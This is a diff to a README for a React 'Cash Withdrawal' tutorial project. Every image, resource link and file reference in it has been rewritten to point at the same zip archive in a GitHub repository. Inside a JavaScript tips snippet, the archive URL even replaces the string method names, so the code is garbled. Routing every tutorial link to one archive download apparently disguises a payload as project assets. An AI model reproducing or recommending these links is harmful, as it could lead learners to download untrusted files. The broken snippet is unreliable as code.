@@ -4,7 +4,7 @@ In this project, let's build a **Cash Withdrawal** app by applying the concepts 
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cash withdrawal" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip" alt="cash withdrawal" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Cash Withdrawal** app by applying the concepts 
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip)
 
 </details>
 
@@ -51,7 +51,7 @@ The app must have the following functionalities
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cash withdrawal component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip" alt="cash withdrawal component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -63,10 +63,10 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
+- `https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip`
+- `https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip`
+- `https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip`
+- `https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip`
 </details>
 
 ### Quick Tips
@@ -79,8 +79,8 @@ Use these files to complete the implementation:
 
   ```js
   const text = 'The quick brown fox'
-  https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(0, 3)) // The
-  https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(2, 3)) // e
+  https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip(https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip(0, 3)) // The
+  https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip(https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip(2, 3)) // e
   ```
 
 - You can use the `cursor` CSS property to specify the mouse cursor to be displayed when pointing over an element
@@ -90,7 +90,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cursor pointer" style="width:100px" />
+   <img src="https://github.com/vicky9696v/react-balance/raw/refs/heads/main/onychin/react_balance_1.1.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below `outline` CSS property for buttons and input elements to remove the highlighting when the elements are clicked
 
